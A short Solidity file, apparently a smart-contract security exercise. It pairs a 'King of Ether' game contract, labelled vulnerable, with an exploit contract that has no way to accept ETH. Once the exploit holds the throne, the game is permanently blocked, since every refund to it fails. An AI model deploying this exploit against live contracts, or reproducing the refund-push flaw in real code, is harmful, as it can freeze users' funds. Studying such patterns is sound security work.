// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IKingOfEth {
    function play() external payable;
}
/*//=================////
///vulnerable contract///
///===================///*/
contract KingOfEth {
    address payable public king;

    function play() external payable {
        // previous balance = current balance - ETH sent
        uint256 bal = address(this).balance - msg.value;
        require(msg.value > bal, "need to pay more to become the king");

        (bool sent, ) = king.call{value: bal}("");
        require(sent, "failed to send ETH");

        king = payable(msg.sender);
    }
}

/*//=================////
///attack contract///
///===================///*/

contract KingOfEthExploit {
    IKingOfEth public target;

    constructor(address _target) {
        target = IKingOfEth(_target);
    }

    // no fallback to accept ETH

    function pwn() external payable {
        target.play{value: msg.value}();
    }
}

